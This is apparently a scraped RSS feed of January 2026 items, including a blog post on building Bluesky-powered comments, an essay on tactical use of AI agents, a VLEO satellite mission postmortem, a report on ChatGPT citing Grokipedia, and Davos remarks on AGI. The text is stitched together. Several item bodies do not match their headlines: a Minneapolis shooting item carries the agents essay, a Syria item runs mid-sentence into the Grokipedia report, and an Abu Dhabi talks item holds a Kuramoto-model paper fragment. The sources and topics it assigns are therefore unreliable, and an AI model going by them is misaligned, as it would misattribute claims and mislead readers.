But I decided to build this feature myself instead. Mainly this is because I wanted to make a few styling changes anyway to match the rest of my site. But I also wanted to leave the option open to adding more features in the future, which would be easier to do if I wrote the code myself. The entire implementation is small regardless, amounting to only ~200 LOC between the UI components and API functions.Initially, I planned to allow people to directly post on Bluesky via my site. This would work by providing an OAuth flow that gives my site permission to post on Bluesky on behalf of the user. I actually did get the auth flow working, but building out a UI for posting and replying to existing comments is difficult to do well. Going down this path quickly leads to building what is essentially a custom Bluesky client, which I didn't have the time or interest in doing right now. Moreover, because the user needs to go through the auth flow and sign-in to their Bluesky account, the process is not really much easier than posting directly on a linked Bluesky post.Without the requirement of allowing others to directly post on my site, the implementation became much simpler. Essentially, my task was to specify a Bluesky post that corresponds to the article in the site's metadata. Then, when the page loads I fetch the replies to that post from Bluesky, parse the response, and display the results in a simple comment section UI.As explained in my last post, this site is built using React Server Components and Parcel. The content of my articles are written using MDX, an extension to Markdown that allows directly embedding JavaScript and JSX. In each post, I export a  object that I validate using a Zod schema. For instance, the metadata for this post looks like this:The value of  references the Bluesky post from which I'll pull replies to display in the comment section. Because my project is built in TypeScript, it was easy to integrate with the Bluesky TypeScript SDK ( on NPM). Reading the Bluesky API documentation and Zue's implementation led me to the  endpoint. Given an AT Protocol URI, this endpoint returns an object with data on the given post and its replies.I could have interacted directly with the Bluesky API from my React component using  and . However, it can be a bit tricky to correctly handle loading and a error states, even for a simple feature like this. Because of this, I decided to use the Tanstack  package to manage the API request/response cycle. This library takes care of the messy work of handling errors, retries, and loading states while I simply provide it a function to fetch the post data.Once I obtain the Bluesky response, the next task is parsing out the content and metadata for the replies. Bluesky supports a rich content structure in its posts for representing markup, references, and attachments. Building out a UI that fully respects this rich content would be difficult. Instead, I decided to keep it simple by just pulling out the text content from each reply.Even so, building a UI that properly displays threaded comments, particularly one that is formatted well on small mobile devices, can be tricky. For now, my approach was to again keep it simple. I indented each reply and added a left border to make it easier to follow reply threads. Otherwise, I mostly copied design elements for layout of the profile picture and post date from Bluesky.Lastly, I added a UI component linking to the parent post on Bluesky, and encouraging people to add to the conversation there. With this, the read-only comment section implementation was complete. If there's interest, I could publish my version of Bluesky comments as a standalone package. But several of the choices I made were relatively specific to my own site. Moreover, the implementation is simple enough that others could probably build their own version from reading the source code, just as I did using Zue's version.Let me know what you think by replying on Bluesky. Hopefully this can help increase engagement with my blog posts, but then again, my last article generated no replies, so maybe not 😭.Thanks everyone for all the positive feedback! I made a few improvements last night and today. I added control button that allows you to sort comments by top, latest, or oldest. I also included the like count beneath each comments, and made a few small styling improvements.A few people have asked about adding this to their own site, or about other implementation details. For that, feel free to check out the source code on GitHub (and in particular  and ).And as I mentioned earlier, I'm certainly not the first person to have thought of this idea or implemented it. In particular, I like the implementations of the same feature by Natalie B. and by Triple Pat.]]></content:encoded></item><item><title>DEVELOPING: Deadly Border Patrol shooting in Minneapolis – What we know so far | DW News</title><link>https://www.youtube.com/watch?v=janzY4uRO_U</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/janzY4uRO_U?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 20:28:40 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[US authorities say a man has died after being shot by federal agents in Minneapolis.

I used almost none of it.That's the confession nobody in the AI-productivity crowd wants to make. Building feels like progress. The agent churns, the code appears, and you get a hit of satisfaction. But satisfaction isn't value. And building isn't shipping.The problem is treating agents like strategy engines when they're execution engines. Its really why we are getting a ton of push back in open source, people writing and reading about agents in code, and even use. Point an agent at a vague goal—"build me a tool that helps with X"—and you'll get something that looks impressive and rots in a folder. Point an agent at a specific task—"rewrite these 200 API calls to use the new authentication pattern"—and you'll save a week.One is generative theatre. The other is actual leverage.The difference is tactical versus strategic deployment.Tactical deployment means applying agents to problems you already understand. The data transformation you've done manually a dozen times. The test coverage you know exactly how to write. The refactor where the pattern is clear but the labor is mind-numbing.Strategic deployment means pointing agents at fuzzy goals and hoping they produce something useful. This almost never works. You get slop that demos well and decays fast.The fundamental lesson: agents amplify clarity. If you know exactly what you want, they're a force multiplier. If you don't, they're an expensive way to generate garbage you'll never use.I call this the Build-Use Gap. Agents have collapsed the cost of building while the cost of using remains unchanged. Integration, polish, workflow fit—these still require human judgment and sustained attention. When you build faster than you can use, you accumulate digital debt that never gets paid.The tactical move: reserve agents for tasks you already know how to do that consume disproportionate time. The migration you've mentally mapped but dread executing. The boilerplate you could write in your sleep. The transformation that's clear but tedious.Stop using agents to explore what's possible. Start using them to execute what's necessary.The productivity gain isn't in what you build. It's in what you actually use.]]></content:encoded></item><item><title>[Announcement] CachyOS January 2026 Release Changelog</title><link>https://www.reddit.com/r/linux/comments/1qlxj56/announcement_cachyos_january_2026_release/</link><author>/u/lajka30</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 20:13:45 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Postmortem: Our first VLEO satellite mission (with imagery and flight data)</title><link>https://albedo.com/post/clarity-1-what-worked-and-where-we-go-next</link><author>topherhaddad</author><category>hn</category><pubDate>Sat, 24 Jan 2026 20:03:39 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[On March 14, 2025, Albedo's first satellite, Clarity-1, launched on SpaceX Transporter-13. We took a big swing with our pathfinder. The mission goals:Prove sustainable orbit operations in VLEO — an orbital regime long considered too harsh for commercial satellites — by overcoming thick atmospheric drag, dangerous atomic oxygen, and extreme speeds.Prove our mid-size, high-performance Precision bus — designed and built in-house in just over two years.Capture 10 cm resolution visible imagery and 2-meter thermal infrared imagery, a feat previously achieved only by exquisite, billion dollar government systems.We proved a ton. We learned a ton.We achieved the first two goals definitively and validated 98% of the technology required for the third. This was an extraordinarily ambitious first satellite. We designed and built a high-performance bus on time and on budget, integrated a large-aperture telescope, and operated in an environment no commercial company had sustained operations in, funded entirely by private capital.Let's start with the result that matters most: VLEO works. And it works better than even we expected.For decades, Very Low Earth Orbit was written off as impractical for normal satellite lifetimes. The atmosphere is thicker, creating drag that would deorbit normal satellites in weeks. If the drag didn't kill you, atomic oxygen would erode your solar arrays and surfaces. To succeed in VLEO required a fundamentally different satellite design.Clarity-1 proved that our design works.The drag coefficient was the headline: 12% better than our design target. Measured multiple times at altitudes between 350 km - 380 km with a repeatable result, this validates our models producing a satellite lifespan of five years at 275 km altitude, averaged across the solar cycle. This was one of our most critical assumptions, and we exceeded it.Atomic oxygen (AO) is the silent killer in VLEO. The deeper you go, the more AO you encounter. It degrades solar arrays and other traditional satellite materials. We developed a new class of solar arrays with unique measures designed to mitigate AO degradation. They work. Even as we descended deeper into VLEO and AO fluence increased logarithmically, our power generation stayed constant. The solar arrays are holding up as designed.Clarity-1 demonstrated over 100 km of controlled altitude descent, stationkeeping in VLEO, and survived a solar storm that temporarily spiked atmospheric density — the impact on Clarity's descent rate was barely noticeable. Momentum management worked. Fault detection worked. Our thrust planning model was validated against GOCE data (a 2009 VLEO R&D mission) with sub-meter accuracy. Radiation tolerance was excellent, with 4x fewer single-event upsets than expected. Orbit determination was dialed.We proved sustainable VLEO operations.Developed and built in just over two years, our in-house bus Precision is now TRL-9: flight-proven on-orbit.Every bus subsystem worked. Every piece of in-house technology we developed performed: our CMG steering law, our operational modes, flight and ground software, electronics boards, and our novel thermal management system.  We hit our embedded software GNC timing deadlines, we converged our attitude and orbit determination estimators, we saw 4π steradian command and telemetry antenna coverage, and we got on-orbit actuals for our power generation and loads.Our cloud-native ground system was incredible. Contact planning across 25 ground stations was completely automated. Mission scheduling updated every 15 minutes to incorporate new tasking and the latest satellite state information, smoothly transitioning to updated on-board command loads with visual tracking of each schedule and its status. Automated thrust planning to achieve our desired orbital trajectory supported 30+ maneuvers per day. Our engineers could track and command the satellite from anywhere with internet and a secure VPN.We pushed 14 successful flight software feature updates on-orbit — and even executed one FPGA update, which is exceptionally rare. The ability to continuously improve throughout Clarity's operational life proved essential — every major solution to challenges we faced involved flight software updates. On-orbit software upgrades are exceedingly tricky to get right, but Clarity-1 was designed from day one around this foundational capability.The first month of the mission was magic.An hour after launch, we watched Clarity-1 deploy from the premium caketopper slot into LEO, giving us an incredible view of the Nile River as she separated from the rocket.First contact came just three hours later at 5:11am MT. Imagine sitting in Mission Control, watching two ground station passes with no data, then on the third: heaps of green, healthy telemetry streaming into all of the subsystem dashboards. Clarity had nailed her autonomous boot-up sequence and rocket separation rate capture. Stuck the landing.The next milestone — and the one many of us were most anxious about — was our autonomous Protect Mode, basically our VLEO version of Safe Mode.We nailed it 14 hours after launch.By 6:45pm that same day, Clarity was in Operational mode, ready for commissioning."Gotta say it: the last 16 hours have been incredible. I started my shift last night hoping to see one bit of data. I wouldn't have believed it if someone told me we'd be in Protect within 14 hours from launch."— Albedo GNC EngineerThe days that followed were a blur of checkboxes turning green. 4-CMG commissioning complete. Payload power-on and checkout validated. Thermal balance for both visible and thermal sensors confirmed. Our first on-orbit software update went flawlessly.Clarity uses Control Moment Gyroscopes (CMGs) to steer the satellite, giving us more agility than more commonly used reaction wheels. We moved onto validating GNC modes such as GroundTrack, which we use to point at communication ground terminals.Clarity-1 accurately pointing at a ground station using GroundTrack mode; visualization is driven using real telemetryWe moved on to commissioning our X-band radio — the high-rate link to downlink imagery. After we uncovered an issue with our ground station provider’s pointing mode, the 800 Mbps link began pumping down data on every pass. The waveforms were clean. Textbook. A direct representation of how locked in our precision CMG pointing was.With our first satellite at this level of complexity, we couldn't believe how smoothly it had gone. Years of developing new technologies had been validated in a fraction of the commissioning time we'd anticipated.Next up was maneuvering from our LEO drop-off altitude down to VLEO, where it would be safe to eject the telescope contamination cover and start snapping pictures.One of our four CMGs experienced a temperature spike in the flywheel bearing. Our Fault Detection, Isolation, and Recovery (FDIR) logic caught it immediately, spun it down, and executed automated recovery actions. But it wouldn't spin back up. Manual recovery attempts followed. Also unsuccessful.Rushing back into CMG operations without understanding the failure mechanism risked killing the mission entirely, so we turned off the other three and put the satellite in two-axis stabilization using the magnetic torque rods.Clarity-1 intentionally spinning to provide two-axis stabilizationWe had a choice. Hack together novel 3-CMG control algorithms as fast as possible and risk losing another, or figure out how to leverage only the torque rods to achieve 3-axis control with sufficient accuracy to navigate the maneuver to VLEO.We went with the torque rods.On satellites this size (~600 kg), magnetic torque rods are typically used for momentum dumping, not attitude control. But we'd built Clarity with unusually beefy torque rods due to the elevated momentum management needs in VLEO. Our GNC team went heads down and developed algorithms to achieve 3-axis attitude control using only torque rods.Within a month, we had it working.Both of our electric thrusters commissioned quickly and were working well. But with torque rods only, our attitude control had 15 to 20 degrees of error, sometimes reaching ~45 degrees. And maneuvering to VLEO isn’t “point into the wind and fire” — it’s continuous vector and trajectory management across an orbit. That kind of control error meant inefficient burns and a much harder descent plan.As the descent progressed, however, the team learned and iterated. With more iteration and flight software updates, we uploaded onboard logic informed by several sources of live data that dialed in our thrust vector control to within 5 degrees of the target. The autonomous thrust planning system we built enabled us to claw back performance that nearly matched our originally projected descent speed.We maneuvered safely past the ISS and entered VLEO. Eager to pop off the contamination cover.Once we reached safe altitude, it was time to jettison the contamination cover protecting our telescope.There are horror stories about contamination covers getting stuck after months of temperature fluctuations.Clarity's was flawless. I'll never forget seeing this blip in telemetry live — confirming through Newton's third law that the jettison was successful. Shortly after, LeoLabs confirmed tracking of two separate objects.We were ready to start imaging.Here's where it got complicated.Our GNC and FSW teams were close but not yet finished with the new 3-CMG control law. CMGs are rarely used in commercial space, let alone by a startup. Then take one more step: singularity-prone 3-CMG control that to our knowledge has not been attempted on a non-exquisite satellite, and certainly not developed and uploaded on-orbit. Traditional algorithms require at least four CMGs to provide capability volumes free of singularities.We were eager to make some amount of progress, so we started imaging on torque rods even though there would be severe limitations: 50+ pixels of smear, large mispointing from the wobble of torque rod control due to earth's magnetic field, and downlink limited to at best two small images per day. The last two constraints meant we were at risk of spending precious downlink capacity on clouds.Sure enough, the first two days of pixels were mostly clouds, but we were happy to peek through a little in this image.Although we couldn't  attitude accurately, we did still have good attitude  after the fact. AyJay whipped up a clever idea with Claude Code that automated posting weather conditions in Slack for each collection. We analyzed that to determine which images were likely clear, and selected those for downlink.We adjusted the focus position a few times, and images continued getting better.Then, 3-CMG control was ready.Out of the box, the new algorithms and software performed perfectly.This visualization shows real telemetry of Clarity performing seven back-to-back imaging maneuvers, with limited 3-CMG agility, followed by an X-band downlink over Iceland minutes later. The satellite was executing sophisticated attitude profiles with very low control error. Fiber-optic gyro measurements showed exquisite jitter performance.Clarity is an agile TDI line-scanner capable of off-nadir imaging. This sequence was near-nadir intentionally for calibration purposes.In real time, collecting and downlinking those seven images took ten minutes.And this is where our ground software really showed its teeth. On most missions, “data on the ground” is just the start — turning raw bits into something viewable is a slow chain of handoffs and batch processing. For us, within seconds of the downlink finishing, the image product pipeline was already posting processed snippets into our company Slack. Literally seconds.That end-to-end loop — photons in orbit to a viewable product on the ground, within minutes — is a capability that’s still rare in this industry.As expected with smear reduced, image quality improved immediately.We were ready to execute focus calibration.Large telescope optics experience hygroscopic dryout during the first few months on-orbit — moisture trapped in materials during ground assembly slowly releases in the vacuum of space, causing the focus position to drift. Dialing in best focus requires dozens of iterations: capture images, analyze sharpness, adjust focus position, repeat. Each cycle gets you closer to the optical performance the system was designed for, and our telescope’s on-ground alignment was verified to spec.After a few iterations of this, we could start to see cars.Even this early into imaging, the infrared images blew us away. Using a low-cost microbolometer — a fraction of the price of cooled IR sensors — we captured thermal signatures that showed ships in Tokyo Bay, steel processing facilities where we could distinguish individual coke ovens from their smokestacks, and distinct signatures between real vegetation and turf — a good proxy for camouflage detection. Day or night, clear as day.Three days into the excitement, CMG problems started again.A second CMG began showing the same telemetry signatures we now recognized as warning signs.What we had learned from the investigation: the allowable temperature specifications of the CMGs were much higher than the true limit, constrained by what the lubricant inside the flywheel could handle. A straightforward fix for the future — an unfortunate corner case to learn about in hindsight.The second CMG showing issues was also on the hot side of the satellite. While we had overhauled the vehicle and CMG operations to prevent additional bearing wear, the damage had already been done in the first month of the mission.We spent months trying everything we could to get the CMGs to operate sustainably. The team attempted many clever solutions, one of which revived the first CMG that had locked up. We uploaded a feature to select any 3 of the 4 CMGs for operator commanding. But we weren't able to get sustained, reliable operation.Despite the CMG challenges, here's what the imaging journey proved.The full end-to-end image chain works. Photons hit our optics, get captured by our sensor, processed through payload electronics, packetized and encrypted, transmitted via our X-band radio, received on the ground, and processed into image products. The entire chain is validated.The end-to-end loop is fast. Within 30 seconds of a downlink, processed image snippets were already posting to our company Slack.Sensor performance exceeded expectations. Dynamic range, radiometry, color balance, band-to-band alignment — all look great, even on uncalibrated imagery.We can scan out long images. Our line-scanning approach produced strips 20-30 kilometers long, exactly as designed.Pointing accuracy and high quality telemetry validates the ingredients for precise geolocation. The data we need to pinpoint where each pixel lands on Earth to <5m (closed-loop CE90) is there.Jitter and smear are low. Fiber-optic gyro measurements confirmed 3x lower smear and 11x lower jitter compared to our goal — a critical ingredient for exquisite imagery.Our proprietary image scheduler works. The automated system that plans collections, manages constraints, and optimizes what we capture each day performed as designed.Nine months into the mission, we lost contact with Clarity-1.By that point, we had largely exhausted our options on the CMGs. The path to further image quality improvement had effectively closed.We had been tracking intermittent memory issues in our TT&C radio throughout the mission, working around them as they appeared. Our best theory is that one of these issues escalated in a way that corrupted onboard memory and is preventing reboots. We've tried several recovery approaches. So far, none have worked, and the likelihood of recovery looks low at this point.But here's what matters: the VLEO validation data we collected is sufficient.We combined a state-of-the-art atmospheric density model, our high-fidelity orbital dynamics force models, and months of natural orbit decay data from 350 to 380 km altitude to determine Clarity’s coefficient of drag — with repeatable results at different altitudes. That drag coefficient, paired with our demonstrated ability to maintain altitude in VLEO for months using high-efficiency thrusters, tells us exactly how the vehicle behaves under aerodynamic drag across the VLEO regime — and validates an average five-year lifespan at 275 km across the solar cycle. Telemetry from our solar arrays, together with onboard atomic oxygen sensor data, shows peak power generation stayed constant after exposure to VLEO levels of AO fluence — proving our AO mitigation worked.Thanks to our friends at LeoLabs, we've validated that Clarity is maintaining attitude autonomously. She's still up there, still oriented, still descending through VLEO. Just not talking to us.Even before this, we had started developing an in-house TT&C radio for our systems moving forward, rather than reusing this radio that was procured from a third party. We’ll incorporate learnings from this reliability issue into that.We're still working the problem. This chapter isn't over yet. But even if it is, Clarity-1 gave us what we needed to build what comes next.If you think about exquisite imagery as a pyramid, we needed 100% of the systems working together to achieve the pinnacle: 10 cm visible imagery. We got to about 98%. Everything else in that pyramid — the entire foundation — is proven and retired.Our drag coefficient. Our atomic oxygen resilience. Our solar arrays. Our thermal management. Our flight software. Our ground software. Our CMG steering laws. Our precision pointing algorithms. Our payload electronics. Our sensor performance. Our image processing chain. Our ability to operate sustainably in VLEO. Our team.We know exactly what to fix. It’s straight forward: operate the CMGs at lower temperature. The system thermal design is already updated in the next build to maximize CMG life going forward.Beyond the CMGs, there were a handful of learnings on the margins. We learned our secondary mirror structure could be stiffer — already in the updated design. We learned we could use more heater capacity in some payload zones — already fixed.We learned from the things that worked, too. We're well down the development path for next-gen flight software, avionics, and power distribution. Orbit determination and geolocation will be even better. Additional surface treatments will improve drag coefficient further. Power-generation will increase while maintaining the proven atomic oxygen resilience. The list goes on.The path to exquisite imagery is clear. And that’s only one of many exciting capabilities unlocked by sustainable operations in VLEO.Our next VLEO mission will incorporate these learnings and demonstrate new features that enable missions beyond imaging — we’ll share more details soon. In parallel, imaging remains a core focus: we’re continuing to build optical payloads for EO/IR missions as part of a broader VLEO roadmap.The successes of Clarity-1 reinforced our core conviction: VLEO isn’t just a better orbit for imaging — it’s the next productive orbital layer.The physics are unforgiving, but that’s exactly why it matters. Go lower and you unlock a step-change in performance: sharper sensing, faster links, lower latency, and a new level of responsiveness. The reason VLEO has been written off for decades isn’t lack of upside — it’s that most satellites simply can’t survive there long enough to matter.Clarity proved the hard parts: sustainable VLEO operations, validated drag and lifetime models, atomic oxygen resilience, and a flight-proven high-performance bus. We’re not speculating about VLEO. We’re operating in it, learning in it, and capitalized to scale it.]]></content:encoded></item><item><title>Tech CEOs boast and bicker about AI at Davos</title><link>https://techcrunch.com/2026/01/24/tech-ceos-boast-and-bicker-about-ai-at-davos/</link><author>Anthony Ha</author><category>tech</category><pubDate>Sat, 24 Jan 2026 20:00:46 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[There were times at this week’s meeting of the World Economic Forum when Davos seemed transformed into a high-powered tech conference.]]></content:encoded></item><item><title>Syria&apos;s government considers next steps after deadline given to Kurdish SDF expires | DW News</title><link>https://www.youtube.com/watch?v=N7n41v4SRFQ</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/N7n41v4SRFQ?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 20:00:16 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[In Syria, time is running out on a ceasefire between the government and Kurdish forces – as talks over the future of Kurdish-controlled areas continue.

These included queries on political structures in Iran, such as salaries of the Basij paramilitary force and the ownership of the Mostazafan Foundation, and questions on the biography of Sir Richard Evans, a British historian and expert witness against Holocaust denier David Irving in his libel trial.Grokipedia, launched in October, is an AI-generated online encyclopedia that aims to compete with Wikipedia, and which has been criticised for propagating rightwing narratives on topics including gay marriage and the 6 January insurrection in the US. Unlike Wikipedia, it does not allow direct human editing, instead an AI model writes content and responds to requests for changes.ChatGPT did not cite Grokipedia when prompted directly to repeat misinformation about the insurrection, about media bias against Donald Trump, or about the HIV/Aids epidemic – areas where Grokipedia has been widely reported to promote falsehoods. Instead, Grokipedia’s information filtered into the model’s responses when it was prompted about more obscure topics.For instance, ChatGPT, citing Grokipedia, repeated stronger claims about the Iranian government’s links to MTN-Irancell than are found on Wikipedia – such as asserting that the company has links to the office of Iran’s supreme leader.ChatGPT also cited Grokipedia when repeating information that the Guardian has debunked, namely details about Sir Richard Evans’ work as an expert witness in David Irving’s trial.GPT-5.2 is not the only large language model (LLM) that appears to be citing Grokipedia; anecdotally, Anthropic’s Claude has also referenced Musk’s encyclopedia on topics from petroleum production to Scottish ales.An OpenAI spokesperson said the model’s web search “aims to draw from a broad range of publicly available sources and viewpoints”.“We apply safety filters to reduce the risk of surfacing links associated with high-severity harms, and ChatGPT clearly shows which sources informed a response through citations,” they said, adding that they had ongoing programs to filter out low-credibility information and influence campaigns.Anthropic did not respond to a request for comment.But the fact that Grokipedia’s information is filtering – at times very subtly – into LLM responses is a concern for disinformation researchers. Last spring, security experts raised concerns that malign actors, including Russian propaganda networks, were churning out massive volumes of disinformation in an effort to seed AI models with lies, a process called “LLM grooming”.In June, concerns were raised in the US Congress that Google’s Gemini repeated the Chinese government’s position on human rights abuses in Xinjiang and China’s Covid-19 policies.Nina Jankowicz, a disinformation researcher who has worked on LLM grooming, said ChatGPT’s citing Grokipedia raised similar concerns. While Musk may not have intended to influence LLMs, Grokipedia entries she and colleagues had reviewed were “relying on sources that are untrustworthy at best, poorly sourced and deliberate disinformation at worst”, she said.And the fact that LLMs cite sources such as Grokipedia or the Pravda network may, in turn, improve these sources’ credibility in the eyes of readers. “They might say, ‘oh, ChatGPT is citing it, these models are citing it, it must be a decent source, surely they’ve vetted it’ – and they might go there and look for news about Ukraine,” said Jankowicz.Bad information, once it has filtered into an AI chatbot, can be challenging to remove. Jankowicz recently found that a large news outlet had included a made-up quote from her in a story about disinformation. She wrote to the news outlet asking for the quote to be removed, and posted about the incident on social media.The news outlet removed the quote. However, AI models for some time continued to cite it as hers. “Most people won’t do the work necessary to figure out where the truth actually lies,” she said.When asked for comment, a spokesperson for xAI, the owner of Grokipedia, said: “Legacy media lies.”]]></content:encoded></item><item><title>Bye Bye Gmail</title><link>https://m24tom.com/bye-bye-gmail/show</link><author>tklenke</author><category>hn</category><pubDate>Sat, 24 Jan 2026 19:44:52 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[it's been great, but it's not me, it's you Please remove  as my primary email address and substitute . I will try to respond to email sent to @gmail.com but no guarantees.A week or two ago I was surprised to see a Google Gemini summary at the top of my email on my phone. A day or two later this appeared in my web client as well. Look, I love our new overlords (for the record m'lords I nearly always use "please" and "thank you"). I was an early adopter and introduced many of you to the LLMs. I still am a frequent user... I mean someone who has all the answers and blows smoke up my ass... perfect right!Here's the thing. I like to read things from my friends that they have taken the time to write. I personally hate texting. All the nuance is gone. Often the humor. Sad. Makes me want to have a beer with you... eye contact... blech. The  thing I want is a summary... at the top of the email... highlighted... that I  turn off.I tried to turn it off. I can. It's under Gmail -> Settings -> General -> Smart Features (checkbox). ... the AI summaries is now grouped with the Smart Tabs.For those of you who do not use Gmail (or do use Gmail and don't use Smart Tabs), Smart Tabs (officially the Tabbed Inbox) have been part of Gmail since 2013; well actually the technology behind them—Smart Labels—actually debuted two years earlier. (Thank you Gemini, yes I  truly love you. Tell me again about the comparisons of Stephen Miller and Heinrich Himmler's tactics please?)Smart Tabs automatically sort my incoming flood of solicited commercial email ( laughter from those who know my first start-up) into five buckets: K&L Wine Merchants at the top of the list. Hi Andrew on Facebook (that I only log into from Firefox running on a VM). Actual transactional emails from companies. at the top of the list (a newsletter I'd like to read but don't want to make the time justify paying for the content).I tried turning off Smart Features and oh my, that's not usable. So I lived with the AI summary at the top. For a week. Then this morning, I saw several messages in my Primary tab that normally get sorted into Promotions, Social, Updates or Forums. This is not unheard of; sometimes a company uses a new incoming address or something and stuff gets put in the wrong bucket.But  time, I got a popup that says I must "Share" this message with Google and links to the Privacy Policy and Google Terms of Service. And an explicit sentence:"Messages and attachments might be reviewed by humans, so don't share any sensitive or confidential information."I'm not naive. I'm an early adopter, my email address includes my name and no numbers. I was a direct marketer when we still were the red-headed step-children of the product managers.  I carpooled to Symantec with Google employee no 11's girlfriend (Go Beavers!) From the get-go, having Google read my email in order to provide targeted advertising was part of the deal. I was fine with that.... now... what they are saying is that... we are going to use your email to train our LLMs. I'm not okay with that. That knowledge of my way of writing, my personal details, my confidential commercial information is  okay to use to train your models. 'Cause I expect mistakes will be made and more information will reside in the model than those at Google (or FB, MSFT etc) intended. And I'm not really up for assuming the risk that my information is accessible via the model  of Google.So... goodbye Gmail. It's been great. Really great. I'm sure I'll miss you. Bye.My email is now being hosted by Microsoft, so hopefully will be free of the outages and limits some of you have experienced with that email in the past. There it will reside until I cannot turn off MSFT's ability to read my email. Then I guess it's off to Switzerland ( https://proton.me/about ); my email can be with my gold.

The large language models (LLMs) that have captivated the world are not a path to human-level intelligence, two AI experts asserted in separate remarks at Davos. Demis Hassabis, the Nobel Prize-winning CEO of Google DeepMind, and the executive who leads the development of Google's Gemini models, said today's AI systems, as impressive as they are, are "nowhere near" human-level artificial general intelligence, or AGI. [Though the artilcle notes that later Hassabis predicted there was a 50% chance AGI might be achieved within the decade.] Yann LeCun — an AI pioneer who won a Turing Award, computer science's most prestigious prize, for his work on neural networks — went further, saying that the LLMs that underpin all of the leading AI models will never be able to achieve humanlike intelligence and that a completely different approach is needed... ["The reason ... LLMs have been so successful is because language is easy," LeCun said later.] 

Their views differ starkly from the position asserted by top executives of Google's leading AI rivals, OpenAI and Anthropic, who assert that their AI models are about to rival human intelligence. Dario Amodei, the CEO of Anthropic, told an audience at Davos that AI models would replace the work of all software developers within a year and would reach "Nobel-level" scientific research in multiple fields within two years. He said 50% of white-collar jobs would disappear within five years. OpenAI CEO Sam Altman (who was not at Davos this year) has said we are already beginning to slip past human-level AGI toward "superintelligence," or AI that would be smarter than all humans combined... 

The debate over AGI may be somewhat academic for many business leaders. The more pressing question, says Cognizant CEO Ravi Kumar, is whether companies can capture the enormous value that AI already offers. According to Cognizant research released ahead of Davos, current AI technology could unlock approximately $4.5 trillion in U.S. labor productivity — if businesses can implement it effectively.]]></content:encoded></item><item><title>Agent orchestration for the timid</title><link>https://substack.com/inbox/post/185649875</link><author>markferree</author><category>hn</category><pubDate>Sat, 24 Jan 2026 19:25:53 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Man fatally shot in Minneapolis – here’s what we know</title><link>https://www.channel4.com/news/man-fatally-shot-in-minneapolis-heres-what-we-know</link><author>Sarah Beale</author><category>news</category><pubDate>Sat, 24 Jan 2026 19:10:50 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[The Mayor of Minneapolis has urged Americans to stand with his city, after another fatal shooting involving immigration agents.Jacob Frey called on President Trump “to act like a leader” and remove federal agents from the city.Police say the victim is believed to be a local resident and a US citizen.His death from multiple gunshot wounds triggered more clashes between protesters and law enforcement.]]></content:encoded></item><item><title>BirdyChat becomes first European chat app that is interoperable with WhatsApp</title><link>https://www.birdy.chat/blog/first-to-interoperate-with-whatsapp</link><author>joooscha</author><category>hn</category><pubDate>Sat, 24 Jan 2026 19:04:08 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Start 1:1 chats with WhatsApp users using their phone numberSend messages, photos and filesCommunicate over an encrypted connectionUse your work email as your identity instead of a personal phone number]]></content:encoded></item><item><title>Confquery: A scriptable command-line utility for editing linux config files like pacman.conf</title><link>https://github.com/AmmoniumX/confquery</link><author>/u/No-Dentist-1645</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 19:02:00 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>More talks expected next week after Ukraine, Russia and US conclude Abu Dhabi meeting</title><link>https://www.youtube.com/watch?v=BCjylA8tVfw</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/BCjylA8tVfw?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 19:01:23 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[More talks expected next week after Ukraine, Russia and US conclude Abu Dhabi meeting

Watanabe and Strogatz [69] demonstrated that the simple Kuramoto ensemble with globally coupled identical oscillators exhibits 3-dimensional dynamics. They have shown that dynamics of a large ensemble can be reduced to the system of ODE’s for three global variables. This implies that an ensemble consisting of N oscillators admits N − 3 constants of motion. This result initiated the new research direction which deals with symmetries and invariant submanifolds in simple Kuramoto networks.\
The underlying symmetries have been exposed in 2009. by Marvel, Mirrolo and Strogatz [70].\
Further insights into the relation between hyperbolic geometry and Kuramoto models have been reported in [71]. It has been demonstrated that (under certain conditions on the coupling function f) Kuramoto dynamics of the form (6) are gradient flows in the unit disc with respect to hyperbolic metric. Potential function for dynamics (7) has particularly transparent geometric interpretation. It turns out that dynamics of Kuramoto ensembles with repulsive interactions uncover a point inside the unit disc that has the minimal sum of hyperbolic distances to the initial points on S1. In complex analysis this point is conformal barycenter [72] of the initial configuration.(1) Vladimir Jacimovic, Faculty of Natural Sciences and Mathematics, University of Montenegro Cetinjski put bb., 81000 Podgorica Montenegro (vladimirj@ucg.ac.me).:::info

 But "When four astronauts begin a historic trip around the moon as soon as February 6, they'll climb aboard NASA's 16.5-foot-wide Orion spacecraft with the understanding that it has a known flaw — one that has some experts urging the space agency not to fly the mission with humans on board..." 

